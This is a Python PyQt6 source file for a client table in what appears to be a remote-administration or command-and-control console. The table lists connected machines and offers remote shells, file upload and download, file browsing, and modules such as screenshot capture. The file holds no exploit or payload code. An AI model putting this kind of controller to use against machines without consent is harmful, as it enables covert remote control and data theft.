from PyQt6.QtWidgets import (QTableWidget, QTableWidgetItem, QHeaderView, QMenu, 
                            QMessageBox, QFileDialog, QInputDialog, QDialog, 
                            QVBoxLayout, QProgressDialog)
from PyQt6.QtCore import Qt, QTimer
from PyQt6.QtGui import QAction, QColor
import logging
from datetime import datetime
import os
from file_transfer import FileTransfer, FileUploadWorker  # Add FileUploadWorker here

class ClientTable(QTableWidget):
    def __init__(self, server_manager, module_manager=None):
        super().__init__()
        self.server_manager = server_manager
        self.module_manager = module_manager
        self.file_transfer = FileTransfer(server_manager)  # Add this line
        self.remote_shells = {}
        self.logger = logging.getLogger(__name__)
        self.setup_ui()
        
        # Add refresh timer
        self.refresh_timer = QTimer(self)
        self.refresh_timer.timeout.connect(self.refresh_clients)
        self.refresh_timer.start(1000)  # Refresh every second
        
    def setup_ui(self):
        """Setup the table UI with improved visibility"""
        self.setStyleSheet("""
            QTableWidget {
                background-color: #1a2234;
                border-radius: 8px;
                gridline-color: #2d3748;
                color: white;
                selection-background-color: #2d3748;
            }
            QHeaderView::section {
                background-color: #2d3748;
                color: white;
                padding: 8px;
                border: none;
                font-weight: bold;
            }
            QTableWidget::item {
                padding: 8px;
                border-bottom: 1px solid #2d3748;
            }
            QTableWidget::item:selected {
                background-color: #374151;
            }
        """)
        
        # Setup columns
        columns = ["Name", "IP", "Port", "OS", "Status", "Connected At", "Ping"]
        self.setColumnCount(len(columns))
        self.setHorizontalHeaderLabels(columns)
        
        # Configure header
        header = self.horizontalHeader()
        for i in range(len(columns)):
            header.setSectionResizeMode(i, QHeaderView.ResizeMode.ResizeToContents)
            
        # Configure table properties
        self.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        self.verticalHeader().setVisible(False)
        self.setShowGrid(True)
        
        # Setup context menu
        self.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.customContextMenuRequested.connect(self.show_context_menu)

    def refresh_clients(self):
        """Refresh client list with enhanced logging"""
        try:
            clients = self.server_manager.get_active_clients()
            self.logger.debug(f"Refreshing clients table - found {len(clients)} clients")
            
            self.setRowCount(len(clients))
            
            for row, client in enumerate(clients):
                try:
                    self.logger.debug(f"Processing client: {client}")
                    
                    # Extract client info
                    address = client.get('address', ['Unknown', 'Unknown'])
                    name = client.get('name', f'Client-{row + 1}')
                    ip = str(address[0])
                    port = str(address[1])
                    os_type = client.get('os', 'Windows')
                    status = client.get('status', 'Unknown')
                    connected_at = client.get('connected_at', datetime.now())
                    if isinstance(connected_at, datetime):
                        connected_at = connected_at.strftime('%Y-%m-%d %H:%M:%S')
                    ping = client.get('ping', 'N/A')
                    
                    # Create table items
                    items = [
                        (0, name),
                        (1, ip),
                        (2, port),
                        (3, os_type),
                        (4, status),
                        (5, str(connected_at)),
                        (6, str(ping))
                    ]
                    
                    for col, value in items:
                        item = QTableWidgetItem(str(value))
                        item.setFlags(item.flags() & ~Qt.ItemFlag.ItemIsEditable)
                        
                        # Color code status
                        if col == 4:
                            if value.lower() == 'connected':
                                item.setForeground(QColor('#4fd1c5'))
                            else:
                                item.setForeground(QColor('#f56565'))
                                
                        self.setItem(row, col, item)
                    
                except Exception as e:
                    self.logger.error(f"Error processing client row {row}: {e}")
                    continue
                    
        except Exception as e:
            self.logger.error(f"Error refreshing clients table: {e}")

    def show_context_menu(self, position):
        """Enhanced context menu with shell focus, modules, and file transfer"""
        try:
            row = self.currentRow()
            if row < 0:
                return
                
            # Get client info
            client_ip = self.item(row, 1).text()
            client_port = self.item(row, 2).text()
            client_id = f"{client_ip}:{client_port}"
            status = self.item(row, 4).text().lower()
            
            menu = QMenu(self)
            menu.setStyleSheet("""
                QMenu {
                    background-color: #1a2234;
                    color: white;
                    border: 1px solid #2d3748;
                    border-radius: 5px;
                    padding: 5px;
                }
                QMenu::item {
                    padding: 8px 20px;
                    border-radius: 3px;
                }
                QMenu::item:selected {
                    background-color: #2d3748;
                }
                QMenu::item:disabled {
                    color: #4A5568;
                }
            """)
            
            # Shell actions
            shell_action = menu.addAction("🖥️ Open Shell")
            shell_action.setEnabled(status == 'connected')
            
            menu.addSeparator()
            
            # File Transfer Menu
            file_menu = menu.addMenu("📁 File Transfer")
            file_menu.setEnabled(status == 'connected')
            
            upload_action = file_menu.addAction("⬆️ Upload File")
            download_action = file_menu.addAction("⬇️ Download File")
            browse_action = file_menu.addAction("🔍 Browse Files")
            
            menu.addSeparator()
            
            # Module actions (only enabled if connected)
            module_menu = menu.addMenu("📦 Modules")
            module_menu.setEnabled(status == 'connected')
            
            if self.module_manager:
                for module in self.module_manager.get_module_list():
                    module_action = module_menu.addAction(f"▶️ {module['name']}")
                    module_action.setData(module['name'])
            
            menu.addSeparator()
            
            # Connection actions
            disconnect_action = menu.addAction("❌ Disconnect")
            disconnect_action.setEnabled(status == 'connected')
            
            reconnect_action = menu.addAction("🔄 Reconnect")
            reconnect_action.setEnabled(status == 'disconnected')
            
            # Execute menu
            action = menu.exec(self.viewport().mapToGlobal(position))
            if action:
                if action == upload_action:
                    self.upload_file(client_id)
                elif action == download_action:
                    self.download_file(client_id)
                elif action == browse_action:
                    self.browse_client_files(client_id)
                else:
                    self.handle_menu_action(action, client_id, status)
                    
        except Exception as e:
            self.logger.error(f"Error showing context menu: {e}")
            QMessageBox.warning(self, "Error", f"Failed to show menu: {str(e)}")

    def handle_menu_action(self, action, client_id: str, status: str):
        """Handle menu action selection"""
        try:
            if action.text() == "🖥️ Open Shell":
                self.open_shell(client_id)
            elif action.text() == "❌ Disconnect":
                self.disconnect_client(client_id)
            elif action.text() == "🔄 Reconnect":
                self.reconnect_client(client_id)
            elif action.parent() and action.parent().title() == "📦 Modules":
                self.execute_module(client_id, action.data())
                
        except Exception as e:
            self.logger.error(f"Error handling menu action: {e}")
            QMessageBox.warning(self, "Error", f"Failed to execute action: {str(e)}")

    def open_shell(self, client_id: str):
        """Open or focus remote shell window"""
        try:
            if not self.server_manager.is_client_connected(client_id):
                QMessageBox.warning(self, "Error", "Client is not connected")
                return
                
            if client_id in self.remote_shells:
                # Focus existing shell
                self.remote_shells[client_id].show()
                self.remote_shells[client_id].activateWindow()
            else:
                # Import RemoteShellWindow here to avoid circular import
                from .remote_shell import RemoteShellWindow
                # Create new shell
                shell = RemoteShellWindow(self.server_manager, client_id)
                shell.show()
                self.remote_shells[client_id] = shell
                
        except Exception as e:
            self.logger.error(f"Error opening shell: {e}")
            QMessageBox.warning(self, "Error", f"Failed to open shell: {str(e)}")
            
    def disconnect_client(self, client_id: str):
        """Disconnect a client"""
        try:
            if self.server_manager.disconnect_client(client_id):
                self.logger.info(f"Successfully disconnected client {client_id}")
                # Close shell if open
                if client_id in self.remote_shells:
                    self.remote_shells[client_id].close()
                    del self.remote_shells[client_id]
            else:
                raise Exception("Failed to disconnect client")
                
        except Exception as e:
            self.logger.error(f"Error disconnecting client: {e}")
            QMessageBox.warning(self, "Error", f"Failed to disconnect client: {str(e)}")

    def handle_action(self, client_id: str, action: str):
        """Handle menu actions with improved error handling"""
        self.logger.debug(f"Handling action {action} for client {client_id}")
        try:
            if "Remote Shell" in action:
                if client_id not in self.remote_shells:
                    shell_window = RemoteShellWindow(self.server_manager, client_id)
                    self.remote_shells[client_id] = shell_window
                    shell_window.show()
                else:
                    self.remote_shells[client_id].show()
                    self.remote_shells[client_id].activateWindow()
            elif "Disconnect" in action:
                self.server_manager.disconnect_client(client_id)
                self.refresh_clients()  # Immediate refresh
            elif "Screenshot" in action:
                if self.module_manager:
                    command = self.module_manager.execute_module("Capture-Screenshot")
                    success = self.server_manager.send_command(client_id, command)
                    if not success:
                        self.logger.error(f"Failed to send screenshot command to {client_id}")
            elif "Reconnect" in action:
                self.server_manager.reconnect_client(client_id)
                self.refresh_clients()  # Immediate refresh
        except Exception as e:
            self.logger.error(f"Error handling action {action} for client {client_id}: {e}", exc_info=True)

    def upload_file(self, client_id: str):
        """Handle file upload to client with proper threading"""
        try:
            file_path, _ = QFileDialog.getOpenFileName(
                self,
                "Select File to Upload",
                "",
                "All Files (*.*)"
            )
            
            if not file_path:
                return

            if not os.path.exists(file_path):
                QMessageBox.warning(self, "Error", "Selected file does not exist")
                return
                
            # Check file size
            file_size = os.path.getsize(file_path)
            if file_size > 10 * 1024 * 1024:  # 10MB limit
                response = QMessageBox.question(
                    self,
                    "Large File Warning",
                    "The selected file is larger than 10MB. Uploading large files may take time. Continue?",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
                )
                if response != QMessageBox.StandardButton.Yes:
                    return

            remote_path, ok = QInputDialog.getText(
                self,
                "Remote Path",
                "Enter remote path (or leave empty for temp folder):",
                text="$env:TEMP\\"
            )
            
            if not ok:
                return

            # Create progress dialog
            self.progress_dialog = QProgressDialog("Preparing upload...", None, 0, 0, self)
            self.progress_dialog.setWindowModality(Qt.WindowModality.WindowModal)
            self.progress_dialog.setMinimumDuration(0)
            self.progress_dialog.setCancelButton(None)
            self.progress_dialog.setAutoClose(False)
            self.progress_dialog.show()

            # Create and start worker thread
            self.upload_worker = FileUploadWorker(
                self.file_transfer,
                client_id,
                file_path,
                remote_path if remote_path.strip() else None
            )
            
            # Connect signals
            self.upload_worker.progress.connect(self.progress_dialog.setLabelText)
            self.upload_worker.finished.connect(self._handle_upload_complete)
            
            # Start the upload
            self.upload_worker.start()

        except Exception as e:
            self.logger.error(f"Error in upload_file: {e}", exc_info=True)
            QMessageBox.warning(self, "Error", f"Upload failed: {str(e)}")
            if hasattr(self, 'progress_dialog'):
                self.progress_dialog.close()
    
    def _handle_upload_complete(self, success: bool, message: str):
        """Handle upload completion"""
        try:
            self.progress_dialog.close()
            
            if success:
                QMessageBox.information(self, "Success", message)
            else:
                QMessageBox.warning(self, "Error", message)
                
        except Exception as e:
            self.logger.error(f"Error handling upload completion: {e}")
            QMessageBox.warning(self, "Error", f"Error handling upload completion: {str(e)}")

    def download_file(self, client_id: str):
        """Handle file download from client"""
        try:
            remote_path, ok = QInputDialog.getText(
                self,
                "Remote File",
                "Enter remote file path to download:",
            )
            
            if ok and remote_path:
                local_path, _ = QFileDialog.getSaveFileName(
                    self,
                    "Save File As",
                    os.path.basename(remote_path),
                    "All Files (*.*)"
                )
                
                if local_path:
                    transfer = FileTransfer(self.server_manager)
                    success, saved_path = transfer.download_from_target(client_id, remote_path, local_path)
                    if success:
                        QMessageBox.information(self, "Success", f"File downloaded to: {saved_path}")
                    else:
                        QMessageBox.warning(self, "Error", "Failed to download file")

        except Exception as e:
            self.logger.error(f"Error downloading file: {e}")
            QMessageBox.warning(self, "Error", f"Download failed: {str(e)}")

    def browse_client_files(self, client_id: str):
        """Browse and list client files"""
        try:
            path, ok = QInputDialog.getText(
                self,
                "Browse Files",
                "Enter path to browse:",
                text="$env:USERPROFILE"
            )
            
            if ok:
                dialog = QDialog(self)
                dialog.setWindowTitle("Remote Files")
                dialog.setMinimumSize(600, 400)
                dialog.setStyleSheet("""
                    QDialog {
                        background-color: #1a2234;
                        color: white;
                    }
                    QTableWidget {
                        background-color: #1a2234;
                        color: white;
                        border: 1px solid #2d3748;
                        gridline-color: #2d3748;
                    }
                    QHeaderView::section {
                        background-color: #2d3748;
                        color: white;
                        padding: 8px;
                        border: none;
                    }
                    QTableWidget::item {
                        padding: 5px;
                        border-bottom: 1px solid #2d3748;
                    }
                """)
                
                layout = QVBoxLayout(dialog)
                
                file_list = QTableWidget()
                file_list.setStyleSheet("""
                    QScrollBar:vertical {
                        border: none;
                        background: #1a2234;
                        width: 10px;
                        margin: 0px;
                    }
                    QScrollBar::handle:vertical {
                        background: #4a5568;
                        min-height: 20px;
                        border-radius: 5px;
                    }
                    QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
                        border: none;
                        background: none;
                    }
                """)
                
                files = self.file_transfer.list_remote_files(client_id, path)
                if files:
                    file_list.setColumnCount(4)
                    file_list.setHorizontalHeaderLabels(["Name", "Size", "Modified", "Type"])
                    file_list.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
                    file_list.setRowCount(len(files))
                    
                    for i, file in enumerate(files):
                        file_list.setItem(i, 0, QTableWidgetItem(str(file['Name'])))
                        # Convert size to human-readable format
                        size = int(file['Size']) if file['Size'] else 0
                        size_str = self.format_size(size)
                        file_list.setItem(i, 1, QTableWidgetItem(size_str))
                        file_list.setItem(i, 2, QTableWidgetItem(str(file['Modified'])))
                        file_list.setItem(i, 3, QTableWidgetItem(str(file['Type'])))
                    
                    layout.addWidget(file_list)
                    dialog.exec()
                else:
                    QMessageBox.warning(self, "Error", f"Failed to list files in {path}")

        except Exception as e:
            self.logger.error(f"Error browsing files: {e}")
            QMessageBox.warning(self, "Error", f"Browse failed: {str(e)}")

    def format_size(self, size: int) -> str:
        """Convert bytes to human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size < 1024:
                return f"{size:.2f} {unit}"
            size /= 1024
        return f"{size:.2f} PB"